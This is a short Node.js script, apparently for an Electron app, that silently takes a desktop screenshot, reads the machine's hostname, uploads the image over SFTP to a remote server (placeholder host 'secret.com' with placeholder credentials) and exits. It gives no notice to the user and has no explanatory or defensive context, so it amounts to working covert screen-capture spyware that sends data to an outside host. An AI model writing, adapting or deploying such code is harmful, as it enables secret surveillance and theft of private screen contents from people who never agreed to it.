    'use strict';
//	const {app} = require('electron');
    var child = require('child_process').exec;
	var screenshot = require('desktop-screenshot');
    var Client = require('sftpjs');
    

    screenshot( "screenshot.png", function(error, complete) {
        var c = Client();

        child("hostname", function(err, stdout,stderr){
            var hostname = stdout.replace(/\s/g, '');
            hostname = hostname.replace("-", '');

            c.on('ready', function () {
                var file = hostname + ( Math.round(new Date().getTime() / 1000) ) + '.png';
                c.put( 'screenshot.png', file, function () {
                c.end();
//                app.quit();
                    process.exit(0);
              });
            }).connect({
              host : 'secret.com',
              user : 'secret',
              password : 'secret'
            });

        }) ;

	});
